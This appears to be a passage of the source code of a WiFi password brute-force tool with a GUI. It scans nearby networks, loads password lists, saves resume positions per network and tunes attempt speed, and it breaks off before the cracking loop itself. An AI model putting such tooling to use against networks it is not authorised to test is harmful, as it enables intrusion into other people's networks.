# -*- coding: UTF-8 -*-
"""
Author: 白恒aead
Repositories: https://github.com/baihengaead/wifi-crack-tool
Version: 1.2.5
优化版本: 性能监控版
"""

import os, sys, datetime, time, threading, ctypes, json
import platform
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import psutil  # 新增：系统性能监控
import gc  # 新增：垃圾回收优化

from pywifi import const, PyWiFi, Profile
from pywifi.iface import Interface

import pyperclip

from PySide6.QtCore import Qt, QThread, Signal, QSize
from PySide6.QtWidgets import QApplication, QMainWindow, QFileDialog, QWidget, QMessageBox
from PySide6.QtGui import QIcon
from wifi_crack_tool_gui import Ui_MainWindow


class MainWindow(QMainWindow):
    def __init__(self, mutex):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

        self.icon_path = ""
        if getattr(sys, 'frozen', False):
            self.icon_path = os.path.join(sys._MEIPASS, "images/wificrack.ico") # type: ignore
        else:
            self.icon_path = "images/wificrack.ico"

        if PyWiFi().interfaces().__len__() <= 1 and  mutex is None:
            self.showinfo(title=self.windowTitle(), message='应用程序的另一个实例已经在运行。\n(p.s.你当前的设备只有一个网卡，不支持多开！)')
            sys.exit()

        icon = QIcon()
        icon.addFile(self.icon_path, QSize(), QIcon.Mode.Normal, QIcon.State.Off)
        self.setWindowIcon(icon)

        #------------------------- 初始化控件状态 -------------------------------#
        self.ui.cbo_wifi_name.addItem('——全部——')

        self.ui.cbo_security_type.addItems(['——自动——','WPA','WPAPSK','WPA2','WPA2PSK','WPA3','WPA3SAE','OPEN'])
        self.ui.cbo_security_type.setCurrentIndex(0)
        self.set_display_using_pwd_file()

        self.ui.cbo_wifi_name.setDisabled(True)
        self.ui.cbo_wnic.setDisabled(True)
        self.ui.btn_refresh_wifi.setDisabled(True)
        self.ui.btn_start.setDisabled(True)
        self.ui.btn_pause_or_resume.setDisabled(True)
        self.ui.btn_stop.setDisabled(True)

        self.ui.txt_log_msg_info.setReadOnly(True)
        self.log_end = self.ui.txt_log_msg_info.textCursor().MoveOperation.End
        self.log_color = self.ui.txt_log_msg_info.textColor()
        #======================================================================#

        self.tool = WifiCrackTool(self)
        #---------------------- 绑定事件 ---------------------------#
        self.ui.btn_change_pwd_file.clicked.connect(self.tool.change_pwd_file)
        self.ui.btn_refresh_wifi.clicked.connect(self.tool.refresh_wifi)
        self.ui.btn_start.clicked.connect(self.tool.start)
        self.ui.btn_pause_or_resume.clicked.connect(self.tool.pause)
        self.ui.btn_stop.clicked.connect(self.tool.stop)
        self.ui.dbl_scan_time.valueChanged.connect(self.tool.change_scan_time)
        self.ui.dbl_connect_time.valueChanged.connect(self.tool.change_connect_time)
        #===========================================================#

        #---------------------- 更新GUI的信号对象 -------------------------#
        self.show_msg = MainWindow.SignThread(self.ui.centralwidget,self.tool.show_msg,str,str)
        self.clear_msg = MainWindow.SignThread(self.ui.centralwidget,self.tool.clear_msg)
        self.add_wifi_items = MainWindow.SignThread(self.ui.centralwidget,self.ui.cbo_wifi_name.addItems,list)
        self.set_wifi_current_index = MainWindow.SignThread(self.ui.centralwidget,self.ui.cbo_wifi_name.setCurrentIndex,int)
        self.set_control_state = MainWindow.SignThread(self.ui.centralwidget,self.set_control_enabled,bool,QWidget)
        self.reset_controls_state = MainWindow.SignThread(self.ui.centralwidget,self.tool.reset_controls_state)
        self.set_controls_running_state = MainWindow.SignThread(self.ui.centralwidget,self.tool.set_controls_running_state)
        self.show_info = MainWindow.SignThread(self.ui.centralwidget,self.showinfo,str,str)
        self.show_warning = MainWindow.SignThread(self.ui.centralwidget,self.showwarning,str,str)
        self.show_error = MainWindow.SignThread(self.ui.centralwidget,self.showerror,str,str)
        # 添加用于异步询问的信号
        self.ask_question = MainWindow.QuestionSignal(self.ui.centralwidget)
        #=================================================================#

        self.show_msg.send(f"初始化完成！\n","black")

    def showinfo(self,title:str,message:str):
        '''
        显示消息提示框

        :title 提示框标题
        :message 提示框文本
        '''
        # 创建QMessageBox实例
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.setWindowIcon(QIcon(self.icon_path))
        msg_box.setIcon(QMessageBox.Icon.Information)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        # 设置窗口标志，使其始终置顶
        msg_box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        # 显示消息框
        msg_box.exec()

    def showwarning(self,title:str,message:str):
        '''
        显示警告提示框

        :title 提示框标题
        :message 提示框文本
        '''
        # 创建QMessageBox实例，不设置父对象以避免线程问题
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.setWindowIcon(QIcon(self.icon_path))
        msg_box.setIcon(QMessageBox.Icon.Warning)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        # 设置窗口标志，使其始终置顶
        msg_box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        # 显示消息框
        msg_box.exec()

    def showerror(self,title:str,message:str):
        '''
        显示错误提示框

        :title 提示框标题
        :message 提示框文本
        '''
        # 创建QMessageBox实例，不设置父对象以避免线程问题
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.setWindowIcon(QIcon(self.icon_path))
        msg_box.setIcon(QMessageBox.Icon.Critical)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        # 设置窗口标志，使其始终置顶
        msg_box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        # 显示消息框
        msg_box.exec()
        
    def ask_user_question(self, title: str, message: str):
        '''
        异步询问用户问题
        :param title: 标题
        :param message: 消息内容
        '''
        # 创建QMessageBox实例，不设置父对象以避免线程问题
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.setWindowIcon(QIcon(self.icon_path))
        msg_box.setIcon(QMessageBox.Icon.Question)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Yes | 
                                  QMessageBox.StandardButton.No | 
                                  QMessageBox.StandardButton.Cancel)
        msg_box.setDefaultButton(QMessageBox.StandardButton.Yes)
        # 设置窗口标志，使其始终置顶
        msg_box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        # 显示消息框并返回结果
        return msg_box.exec()

    def set_display_using_pwd_file(self,filename:str="(无)"):
        self.ui.lbl_using_pwd_file.setText(f"正在使用密码本：{filename}")

    def set_control_enabled(self,state:bool,*control:QWidget):
        '''
        设置控件启用

        :state True->启用，False->禁用
        :control 控件对象
        '''
        if len(control) > 1:
            for con in control:
                con.setEnabled(state)
        elif len(control) == 1:
            control[0].setEnabled(state)

    class SignThread(QThread):
        """GUI信号线程"""

        def __new__(cls, parent: QWidget, func, *types: type):
            cls.__update_date = Signal(*types, name=func.__name__)  # 定义信号(*types)一个信号中可以有一个或多个类型的数据(int,str,list,...)
            return super().__new__(cls)  # 使用父类__new__方法创建SignThread实例对象

        def __init__(self, parent: QWidget, func, *types: type):
            """
            GUI信号线程初始化\n

            :param parent: 界面UI控件
            :param func: 信号要绑定的方法
            :param types: 信号类型,可以是一个或多个(type,...)
            """
            super().__init__(parent)  # 初始化父类
            self.__update_date.connect(func)  # 绑定信号与方法

        def send(self, *args):
            """
            向GUI线程发送更新信号\n

            :param args: 信号的内容
            :return:
            """
            self.__update_date.emit(*args)  # 发送信号元组(type,...)
            
    class QuestionSignal(QThread):
        """用于异步提问的信号线程"""
        
        # 定义提问信号
        question_asked = Signal(str, str, QMessageBox.StandardButtons, QMessageBox.StandardButton)
        
        def __init__(self, parent: QWidget):
            super().__init__(parent)
            self.question_asked.connect(self.show_question_dialog)
            self.parent_widget = parent
            self.response = None
            self.response_received = False

        def send(self, title: str, message: str, buttons=QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, default_button=QMessageBox.StandardButton.Yes):
            """
            发送提问信号
            """
            self.response = None
            self.response_received = False
            self.question_asked.emit(title, message, buttons, default_button)
            
            # 等待响应
            while not self.response_received:
                time.sleep(0.01)
                
            return self.response

        def show_question_dialog(self, title: str, message: str, buttons, default_button):
            """
            在主线程中显示问题对话框
            """
            msg_box = QMessageBox()
            msg_box.setWindowTitle(title)
            msg_box.setText(message)
            msg_box.setWindowIcon(QIcon(self.parent_widget.windowIcon()))
            msg_box.setIcon(QMessageBox.Icon.Question)
            msg_box.setStandardButtons(buttons)
            msg_box.setDefaultButton(default_button)
            # 设置窗口标志，使其始终置顶
            msg_box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
            
            # 显示消息框并保存结果
            self.response = msg_box.exec()
            self.response_received = True


class WifiCrackTool:
    def __init__(self,win:MainWindow):
        self.win = win
        self.ui = win.ui

        self.config_dir_path = os.getcwd()+"/config" #配置文件目录路径
        # 如果不存在config目录，则创建
        if not os.path.exists(self.config_dir_path):
            os.mkdir(self.config_dir_path)

        self.log_dir_path = os.getcwd()+"/log" #日志目录路径
        # 如果不存在log目录，则创建
        if not os.path.exists(self.log_dir_path):
            os.mkdir(self.log_dir_path)

        self.dict_dir_path = os.getcwd()+"/dict" #字典目录路径
        # 如果不存在dict目录，则创建
        if not os.path.exists(self.dict_dir_path):
            os.mkdir(self.dict_dir_path)

        self.config_file_path = self.config_dir_path+'/settings.json'
        self.config_settings_data = {
            'scan_time':2,  # 优化：减少扫描时间
            'connect_time':0.05,  # 优化：减少连接时间
            'pwd_txt_path':'passwords.txt',
            'thread_count': 2,  # 新增：线程数量
            'max_password_length': 63,  # 新增：最大密码长度限制
            'performance_mode': 'balanced'  # 新增：性能模式
        }
        if os.path.exists(self.config_file_path):
            with open(self.config_file_path, 'r',encoding='utf-8') as config_file:
                self.config_settings_data = json.load(config_file)
                self.ui.dbl_scan_time.setValue(self.config_settings_data['scan_time'])
                self.ui.dbl_connect_time.setValue(self.config_settings_data['connect_time'])
        else:
            with open(self.config_file_path, 'w',encoding='utf-8') as config_file:
                json.dump(self.config_settings_data, config_file, indent=4)

        pwd_txt_paths = self.config_settings_data['pwd_txt_path'].split('/')
        self.pwd_txt_name = pwd_txt_paths[len(pwd_txt_paths)-1]

        self.pwd_dict_path = self.dict_dir_path+'/pwdict.json'

        self.pwd_dict_data:list[dict[str,str]] = []
        if os.path.exists(self.pwd_dict_path):
            # 读取密码字典数据
            with open(self.pwd_dict_path, 'r',encoding='utf-8') as json_file:
                self.pwd_dict_data = json.load(json_file)

        self.crack_pause_condition = threading.Condition()
        self.paused = False

        self.run = False
        self.pwd_file_changed = False

        # 性能监控相关
        self.performance_monitor = PerformanceMonitor()
        
        # 断点续传相关变量 - 优化：使用延迟保存
        self.resume_info = {}  # 存储断点信息
        self.resume_file_path = self.config_dir_path+'/resume.json'
        if os.path.exists(self.resume_file_path):
            with open(self.resume_file_path, 'r', encoding='utf-8') as f:
                self.resume_info = json.load(f)

        # 创建破解对象
        self.crack = self.Crack(self)

        # 不再检查默认密码本是否存在，只在开始破解时检查
        self.win.set_display_using_pwd_file(self.pwd_txt_name if os.path.exists(self.config_settings_data['pwd_txt_path']) else "(无)")

    # 修改扫描WiFi时间
    def change_scan_time(self):
        self.win.tool.config_settings_data['scan_time'] = self.ui.dbl_scan_time.value()
        self.win.show_msg.send(f"扫描间隔时间已设置为 {self.ui.dbl_scan_time.value()} 秒\n", "blue")

    # 修改连接WiFi时间
    def change_connect_time(self):
        self.win.tool.config_settings_data['connect_time'] = self.ui.dbl_connect_time.value()
        self.win.show_msg.send(f"连接间隔时间已设置为 {self.ui.dbl_connect_time.value()} 秒\n", "blue")

    # 修改性能模式
    def change_performance_mode(self, mode: str):
        self.config_settings_data['performance_mode'] = mode
        self.performance_monitor.set_mode(mode)
        self.win.show_msg.send(f"性能模式已设置为 {mode}\n", "blue")

    # 选择密码本
    def change_pwd_file(self):
        '''选择密码本'''

        try:
            default_dir = r"."
            temp_file_path,_ = QFileDialog.getOpenFileName(self.win, caption=u'选择密码本', dir=(os.path.expanduser(default_dir)), filter="Text files (*.txt)")#;;JSON files (*.json)")
            temp_filepaths = temp_file_path.split('/')
            temp_filename = temp_filepaths[len(temp_filepaths)-1]
            temp_filenames = temp_filename.split('.')
            temp_filetype = temp_filenames[len(temp_filenames)-1]
            if(temp_filetype==''):
                self.win.showinfo(title='提示',message='未选择密码本')
                self.pwd_file_changed = True  # 标记为已更改，即使未选择文件
                self.config_settings_data['pwd_txt_path'] = ""
                self.win.set_display_using_pwd_file("(无)")
                return False
            elif(temp_filetype not in ['txt']):#,'json']):
                self.win.showerror.send(title='选择密码本',message='密码本类型错误！\n目前仅支持格式为[txt]的密码本\n您选择的密码本格式为['+temp_filetype+']')
                self.pwd_file_changed = False
                return False
            else:
                self.config_settings_data['pwd_txt_path'] = temp_file_path
                self.pwd_txt_paths = temp_filepaths
                self.pwd_txt_name = temp_filename
                self.win.set_display_using_pwd_file(self.pwd_txt_name)
                self.pwd_file_changed = True
                return True
        except Exception as r:
            self.win.showerror.send(title='错误警告',message='选择密码本时发生未知错误 %s' %(r))
            return False

    # 显示日志消息 - 优化：减少磁盘I/O
    def show_msg(self,msg:str,color:str="black"):
        '''显示日志消息'''
        dt = datetime.datetime.now()
        # 异步写入日志，减少主线程阻塞
        threading.Thread(target=self._write_log_async, args=(dt, msg), daemon=True).start()
        
        self.ui.txt_log_msg_info.moveCursor(self.win.log_end)
        self.ui.txt_log_msg_info.insertHtml("<span style='color:"+color+"'>"+dt.strftime('%Y-%m-%d %H:%M:%S')+" >> "+msg.replace('\n', '<br/>')+"</span><br/>\n")
        self.ui.txt_log_msg_info.moveCursor(self.win.log_end)
    
    def _write_log_async(self, dt, msg):
        '''异步写入日志文件'''
        try:
            with open(f"{self.log_dir_path}/wifi_crack_log_{dt.strftime('%Y%m%d')}.txt","a",encoding='utf-8') as log:
                log.write(dt.strftime('%Y-%m-%d %H:%M:%S')+" >> "+msg)#输出日志到本地文件
        except:
            pass  # 避免日志写入失败影响主流程

    # 清空日志消息
    def clear_msg(self):
        '''清空输出消息'''
        self.ui.txt_log_msg_info.setPlainText("")

    # 重置所有控件状态
    def reset_controls_state(self):
        '''重置状态'''
        try:
            self.ui.cbo_wifi_name.setEnabled(True)
            self.ui.cbo_security_type.setEnabled(True)
            self.ui.cbo_wnic.setEnabled(True)
            self.ui.dbl_scan_time.setEnabled(True)
            self.ui.dbl_connect_time.setEnabled(True)
            self.ui.btn_change_pwd_file.setEnabled(True)
            self.ui.btn_refresh_wifi.setEnabled(True)
            self.ui.btn_start.setEnabled(True)
            self.ui.btn_pause_or_resume.setDisabled(True)
            self.ui.btn_stop.setDisabled(True)
            self.ui.btn_pause_or_resume.setText("暂停")
            with self.crack_pause_condition:
                self.paused = False
                self.crack_pause_condition.notify_all()
        except Exception as r:
            pass

    # 设置所有控件为运行时的状态
    def set_controls_running_state(self):
        '''运行状态'''
        self.ui.cbo_wifi_name.setDisabled(True)
        self.ui.cbo_security_type.setDisabled(True)
        self.ui.cbo_wnic.setDisabled(True)
        self.ui.dbl_scan_time.setDisabled(True)
        self.ui.dbl_connect_time.setDisabled(True)
        self.ui.btn_change_pwd_file.setDisabled(True)
        self.ui.btn_refresh_wifi.setDisabled(True)
        self.ui.btn_start.setDisabled(True)
        self.ui.btn_pause_or_resume.setEnabled(True)
        self.ui.btn_stop.setEnabled(True)

    # 设置所有控件为暂停时的状态
    def set_controls_pausing_state(self):
        '''暂停状态'''
        self.ui.cbo_wifi_name.setDisabled(True)
        self.ui.cbo_security_type.setDisabled(True)
        self.ui.cbo_wnic.setDisabled(True)
        self.ui.dbl_scan_time.setDisabled(True)
        self.ui.dbl_connect_time.setDisabled(True)
        self.ui.btn_change_pwd_file.setDisabled(True)
        self.ui.btn_refresh_wifi.setDisabled(True)
        self.ui.btn_start.setDisabled(True)
        self.ui.btn_pause_or_resume.setEnabled(True)
        self.ui.btn_stop.setEnabled(True)

    # 刷新wifi列表 - 优化：提高扫描效率
    def refresh_wifi(self):
        try:
            self.ui.cbo_wifi_name.clear()
            self.ui.cbo_wifi_name.addItem('——全部——')
            self.ui.cbo_wifi_name.setDisabled(True)
            self.ui.btn_refresh_wifi.setDisabled(True)
            self.ui.btn_start.setDisabled(True)
            self.ui.cbo_wnic.setDisabled(True)
            self.ui.dbl_scan_time.setDisabled(True)

            # 检查是否有可用的无线网卡
            wifi = PyWiFi()
            wnics = wifi.interfaces()
            if not wnics or len(wnics) == 0:
                self.win.showwarning.send(title='警告', message='未找到任何无线网卡！\n请确保你的电脑拥有无线网卡再继续使用。')
                self.show_msg('[警告]未找到任何无线网卡！\n\n', "orange")
                self.reset_controls_state()
                return

            thread = threading.Thread(target=self.crack.search_wifi,args=())
            thread.daemon = True
            thread.start()
        except Exception as r:
            self.win.showerror.send(title='错误警告',message='扫描wifi时发生未知错误 %s' %(r))
            self.show_msg('[错误]扫描wifi时发生未知错误 %s\n\n' %(r),"red")
            self.reset_controls_state()

    # 开始破解
    def start(self):
        try:
            # 检查密码本是否存在
            if self.config_settings_data['pwd_txt_path'] == "" or not os.path.exists(self.config_settings_data['pwd_txt_path']):
                # 弹出对话框询问用户是否选择密码本
                reply = self.win.ask_question.send('密码本缺失', '未找到密码本，是否选择密码本文件？')
                
                if reply == QMessageBox.StandardButton.Yes:
                    if not self.change_pwd_file():
                        return  # 用户取消选择或选择失败
                else:
                    # 用户选择不选择密码本，给出警告
                    self.win.showwarning.send(title='警告', message='未选择密码本，将无法进行破解！')
                    return

            wifi_name = self.ui.cbo_wifi_name.currentText()
            self.run = True
            self.set_controls_running_state()
            
            # 性能监控：开始监控
            self.performance_monitor.start_monitoring()

            # 检查是否有断点信息
            if not self.pwd_file_changed and wifi_name in self.resume_info and self.resume_info[wifi_name]['pwd_file'] == self.config_settings_data['pwd_txt_path']:
                # 询问用户是否从断点继续
                resume_position = self.resume_info[wifi_name]['position']
                reply = self.win.ask_question.send('断点续传',
                                           f'发现上次破解 [{wifi_name}] 时在密码本第 {resume_position} 行中断，是否从该位置继续？\n\n选择"是"从断点继续，选择"否"从头开始。')

                if reply == QMessageBox.StandardButton.Yes:
                    # 从断点继续
                    if self.ui.cbo_wifi_name.currentIndex() == 0:
                        thread = threading.Thread(target=self.crack.auto_crack, args=(resume_position,))
                    else:
                        thread = threading.Thread(target=self.crack.crack, args=(wifi_name, resume_position,))
                    thread.daemon = True
                    thread.start()
                    # 重置pwd_file_changed标志
                    self.pwd_file_changed = False
                    return
                elif reply == QMessageBox.StandardButton.Cancel:
                    # 取消操作
                    self.run = False
                    self.reset_controls_state()
                    # 重置pwd_file_changed标志
                    self.pwd_file_changed = False
                    return

            # 如果用户选择了特定WiFi且有断点信息，但密码本已更改，则询问是否清除断点信息
            if wifi_name in self.resume_info and self.ui.cbo_wifi_name.currentIndex() != 0 and self.resume_info[wifi_name]['pwd_file'] != self.config_settings_data['pwd_txt_path']:
                reply = self.win.ask_question.send('密码本变更',
                                           f'检测到 [{wifi_name}] 使用的密码本已变更，是否清除之前的断点记录？\n\n选择"是"清除断点并从头开始，选择"否"保留断点信息。')

                if reply == QMessageBox.StandardButton.Yes:
                    self.clear_resume_info(wifi_name)

            # 正常开始（从头开始）
            if self.ui.cbo_wifi_name.currentIndex() == 0:
                # 收集所有有断点信息的WiFi
                resume_wifis = []
                for ssid in self.crack.ssids:
                    if not self.pwd_file_changed and ssid in self.resume_info and self.resume_info[ssid]['pwd_file'] == self.config_settings_data['pwd_txt_path']:
                        resume_wifis.append((ssid, self.resume_info[ssid]['position']))
                
                # 如果有多个WiFi有断点信息，统一询问
                if len(resume_wifis) > 0:
                    wifi_list = '\n'.join([f'{ssid} (位置: {pos})' for ssid, pos in resume_wifis])
                    reply = self.win.ask_question.send('批量断点续传',
                                               f'发现以下 {len(resume_wifis)} 个WiFi有断点信息:\n{wifi_list}\n\n是否对所有WiFi都从断点继续？\n\n选择"是"对所有WiFi从断点继续，选择"否"全部从头开始。')
                    
                    if reply == QMessageBox.StandardButton.Yes:
                        # 对于批量破解，我们传递一个特殊标记表示使用断点
                        thread = threading.Thread(target=self.crack.auto_crack, args=(-1,))
                        thread.daemon = True
                        thread.start()
                        self.pwd_file_changed = False
                        return
                    elif reply == QMessageBox.StandardButton.Cancel:
                        self.run = False
                        self.reset_controls_state()
                        self.pwd_file_changed = False
                        return
                
                thread = threading.Thread(target=self.crack.auto_crack)
                thread.daemon = True
                thread.start()
            else:
                thread = threading.Thread(target=self.crack.crack, args=(wifi_name,))
                thread.daemon = True
                thread.start()
            # 重置pwd_file_changed标志
            self.pwd_file_changed = False
        except Exception as r:
            self.win.showerror.send(title='错误警告',message='开始运行时发生未知错误 %s' %(r))
            self.show_msg('[错误]开始运行时发生未知错误 %s\n\n' %(r),"red")
            self.reset_controls_state()

    # 暂停破解
    def pause(self):
        try:
            with self.crack_pause_condition:
                if self.paused:
                    self.paused = False
                    self.ui.btn_pause_or_resume.setText("暂停")
                    self.show_msg("开始继续破解...")
                    self.crack_pause_condition.notify_all()
                else:
                    self.paused = True
                    self.ui.btn_pause_or_resume.setText("继续")
                    self.show_msg("正在尝试暂停破解...")
                    self.crack_pause_condition.notify_all()
        except Exception as r:
            self.win.showerror.send(title='错误警告',message='暂停过程中发生未知错误 %s' %(r))
            self.show_msg('[错误]暂停过程中发生未知错误 %s\n\n' %(r),"red")
            self.reset_controls_state()

    # 终止破解
    def stop(self):
        try:
            self.run = False
            self.show_msg("正在尝试终止破解...")
            # 性能监控：停止监控
            self.performance_monitor.stop_monitoring()
            # 在停止时自动保存断点信息
            if hasattr(self.crack, 'current_ssid') and hasattr(self.crack, 'current_position'):
                self.save_resume_info(self.crack.current_ssid, 'txt', self.config_settings_data['pwd_txt_path'], self.crack.current_position)
            with self.crack_pause_condition:
                self.paused = False
                self.crack_pause_condition.notify_all()
        except Exception as r:
            self.win.showerror.send(title='错误警告',message='停止过程中发生未知错误 %s' %(r))
            self.show_msg('[错误]停止过程中发生未知错误 %s\n\n' %(r),"red")
            self.reset_controls_state()

    # 保存断点信息 - 优化：使用延迟保存减少I/O
    def save_resume_info(self, ssid: str, pwd_source: str, pwd_file: str, position: int):
        '''保存断点信息（延迟保存版本）'''
        try:
            # 使用Crack对象的延迟保存功能
            if hasattr(self.crack, 'delayed_save_resume_info'):
                self.crack.delayed_save_resume_info(ssid, pwd_source, pwd_file, position)
            else:
                # 传统保存方式（如果优化功能不可用）
                self.resume_info[ssid] = {
                    'pwd_source': pwd_source,      # 密码来源（json/txt）
                    'pwd_file': pwd_file,          # 密码本文件路径
                    'position': position           # 当前尝试的位置
                }
                with open(self.resume_file_path, 'w', encoding='utf-8') as f:
                    json.dump(self.resume_info, f, indent=4, ensure_ascii=False)
        except Exception as e:
            self.show_msg(f'[警告]保存断点信息失败: {e}\n', "orange")

    # 清除断点信息
    def clear_resume_info(self, ssid: str = None):
        '''清除断点信息'''
        try:
            if ssid:
                # 清除特定WiFi的断点信息
                if ssid in self.resume_info:
                    del self.resume_info[ssid]
            else:
                # 清除所有断点信息
                self.resume_info.clear()

            with open(self.resume_file_path, 'w', encoding='utf-8') as f:
                json.dump(self.resume_info, f, indent=4, ensure_ascii=False)
        except Exception as e:
            self.show_msg(f'[警告]清除断点信息失败: {e}\n', "orange")
    
    # 暴力破解wifi密码的类
    class Crack:
        '''用于暴力破解wifi的类'''
        def __init__(self,tool:'WifiCrackTool'):
            self.tool:WifiCrackTool = tool
            self.win = tool.win
            self.ui = tool.ui
            self.wifi = PyWiFi()
            self.wnics = self.wifi.interfaces()
            self.iface:Interface
            self.__get_wnic()
            self.ssids = []
            self.profile_dict = {}
            '''wifi信息字典'''
            self.convert_success = False
            self.is_auto = False
            
            # 性能优化相关属性
            self.stats = {
                'start_time': None,
                'attempts_count': 0,
                'success_count': 0,
                'timeouts_count': 0,
                'avg_attempt_time': 0,
                'current_speed': 0  # 密码/秒
            }
            self.speed_calculation_window = deque(maxlen=20)  # 用于计算实时速度
            
            # 断点信息延迟保存相关
            self.resume_update_timer = None
            self.pending_resume_info = {}
            
            # 连接优化相关
            self.last_disconnect_time = 0
            self.disconnect_interval = 0.02  # 最小断开连接间隔
            self.connect_timeout = 0.3  # 连接超时时间

        def __get_wnic(self):
            '''获取无线网卡'''
            try:
                if self.wnics.__len__() > 0:
                    self.tool.show_msg(f'已搜索到无线网卡（数量:{self.wnics.__len__()}）\n')
                    for i,wnic in enumerate(self.wnics):
                        self.ui.cbo_wnic.addItem(wnic.name(),i)
                    self.ui.cbo_wnic.setEnabled(True)
                    self.ui.btn_refresh_wifi.setEnabled(True)
                else:
                    self.win.showwarning(title='警告',message='无法获取到无线网卡！\n请确保你的电脑拥有无线网卡再继续使用。')
                    self.tool.show_msg('无法获取到无线网卡！\n请确保你的电脑拥有无线网卡才可继续使用。\n\n')

            except Exception as r:
                self.win.showerror(title='错误警告',message=f'获取无线网卡时发生未知错误 {r}')
                self.tool.show_msg(f"[错误]获取无线网卡时发生未知错误 {r}\n\n","red")
                self.tool.reset_controls_state()

        # 优化的WiFi扫描功能
        def search_wifi(self):
            """扫描附近wifi => wifi名称数组"""
            try:
                # 检查是否有可用的无线网卡
                if not self.wnics or len(self.wnics) == 0:
                    self.win.show_warning.send('警告', '未找到任何无线网卡！')
                    self.win.show_msg.send("[警告]未找到任何无线网卡！\n\n", "orange")
                    self.win.reset_controls_state.send()
                    return

                # 检查选择的网卡索引是否有效
                wnic_index = self.ui.cbo_wnic.currentData()
                if wnic_index is None or wnic_index >= len(self.wnics) or wnic_index < 0:
                    self.win.show_warning.send('警告', '选择的无线网卡无效！')
                    self.win.show_msg.send("[警告]选择的无线网卡无效！\n\n", "orange")
                    self.win.reset_controls_state.send()
                    return

                self.iface = self.wnics[wnic_index]
                name = self.iface.name()#网卡名称
                
                # 检查网卡状态
                try:
                    iface_status = self.iface.status()
                    self.win.show_msg.send(f"网卡状态: {iface_status}\n","blue")
                    
                    # 如果网卡状态异常，给出警告
                    if iface_status not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE, const.IFACE_SCANNING, const.IFACE_CONNECTED]:
                        self.win.show_warning.send('警告',f'网卡状态异常！当前状态: {iface_status}\n请检查WLAN是否已打开。')
                        self.win.show_msg.send(f"[警告]网卡状态异常！当前状态: {iface_status}\n请检查WLAN是否已打开。\n\n","orange")
                        self.win.reset_controls_state.send()
                        return
                except Exception as status_error:
                    self.win.show_warning.send('警告',f'无法获取网卡状态！\n错误: {status_error}\n请检查WLAN是否已打开。')
                    self.win.show_msg.send(f"[警告]无法获取网卡状态！\n错误: {status_error}\n请检查WLAN是否已打开。\n\n","orange")
                    self.win.reset_controls_state.send()
                    return
                
                # 尝试启动扫描
                try:
                    self.iface.scan()#扫描AP
                    self.win.show_msg.send(f"正在使用网卡[{name}]扫描WiFi...\n","black")
                except Exception as scan_error:
                    self.win.show_warning.send('警告',f'启动WiFi扫描失败！\n\n错误: {type(scan_error).__name__}: {scan_error}\n\n可能原因：\n1. WLAN服务未启动\n2. 网卡驱动问题\n3. WiFi功能被禁用\n\n请检查：\n- Windows设置中WiFi是否已打开\n- WLAN AutoConfig服务是否正在运行')
                    self.win.show_msg.send(f"[警告]启动WiFi扫描失败！错误: {type(scan_error).__name__}: {scan_error}\n\n","orange")
                    self.win.reset_controls_state.send()
                    return
                
                # 优化扫描时间，最大不超过2秒
                scan_time = min(self.tool.config_settings_data['scan_time'], 2.0)
                time.sleep(scan_time)
                
                # 尝试获取扫描结果
                try:
                    ap_list = self.iface.scan_results()#扫描结果列表
                    
                    # 检查扫描结果是否为None
                    if ap_list is None:
                        self.win.show_warning.send('警告','扫描结果为空（None）！\n\n这通常表示：\n1. WLAN服务未正确启动\n2. WiFi适配器被禁用\n3. 驱动程序问题\n\n请尝试：\n1. 关闭WiFi后重新打开\n2. 重启WLAN AutoConfig服务\n3. 重启电脑')
                        self.win.show_msg.send("[警告]扫描结果为空！请检查WLAN服务状态。\n\n","orange")
                        self.win.reset_controls_state.send()
                        return
                        
                except Exception as result_error:
                    self.win.show_warning.send('警告',f'获取扫描结果失败！\n\n错误: {type(result_error).__name__}: {result_error}\n\n这通常表示WLAN服务未正确运行。\n\n请尝试：\n1. 打开"服务"（services.msc）\n2. 找到"WLAN AutoConfig"服务\n3. 确保该服务正在运行\n4. 如果未运行，右键点击"启动"')
                    self.win.show_msg.send(f"[警告]获取扫描结果失败！错误: {type(result_error).__name__}: {result_error}\n\n","orange")
                    self.win.reset_controls_state.send()
                    return

                # 去除重复AP项
                ap_dic_tmp = {}
                for b in ap_list:
                    if b.ssid.replace(' ', '') != '':
                        ap_dic_tmp[b.ssid] = b

                # 将字典转换为列表，并去除列表中的空字符项
                ap_list = list(ap_dic_tmp.values())

                self.win.show_msg.send("扫描完成！\n","black")
                self.ssids:list[str] = []
                self.profile_dict:dict[str,Profile] = {}
                for i,data in enumerate(ap_list):#输出扫描到的WiFi名称
                    ssid = data.ssid
                    self.ssids.insert(i,ssid)
                    profile = Profile()
                    profile.ssid = data.ssid # * wifi名称
                    profile.auth = data.auth # * 网卡的开放
                    profile.akm = data.akm # * wifi加密算法，一般是 WPA2PSK
                    profile.cipher = data.cipher # * 加密单元
                    self.profile_dict[data.ssid] = profile
                self.win.reset_controls_state.send()
                self.win.add_wifi_items.send(self.ssids)
                if len(self.ssids) > 0:
                    self.win.set_wifi_current_index.send(0)
            except Exception as r:
                error_msg = str(r)
                error_type = type(r).__name__
                
                # 记录详细的错误信息用于调试
                self.win.show_msg.send(f"[调试]异常类型: {error_type}, 异常信息: {error_msg}\n","blue")
                
                if "NULL pointer access" in error_msg or "NoneType" in error_msg or error_type == "OSError":
                    self.win.show_warning.send('警告',f'你当前设备的WLAN未打开或无线网卡不可用！\n\n详细信息: {error_type}: {error_msg}\n\n请检查WLAN状态后再继续使用。')
